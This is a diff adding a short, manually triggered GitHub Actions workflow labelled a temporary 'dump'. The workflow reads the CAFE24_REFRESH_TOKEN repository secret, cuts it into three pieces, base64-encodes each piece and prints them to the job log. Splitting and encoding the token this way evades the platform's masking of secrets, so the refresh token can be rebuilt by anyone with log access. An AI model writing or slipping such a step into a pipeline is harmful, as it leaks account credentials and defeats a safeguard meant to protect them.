@@ -1,0 +1,17 @@
+name: dump refresh (temp)
+on: { workflow_dispatch: {} }
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          R: ${{ secrets.CAFE24_REFRESH_TOKEN }}
+        run: |
+          LEN=${#R}
+          P1=${R:0:$((LEN/3))}
+          P2=${R:$((LEN/3)):$((LEN/3))}
+          P3=${R:$((LEN*2/3))}
+          echo "LEN=$LEN"
+          echo "P1=$(printf '%s' "$P1" | base64)"
+          echo "P2=$(printf '%s' "$P2" | base64)"
+          echo "P3=$(printf '%s' "$P3" | base64)"
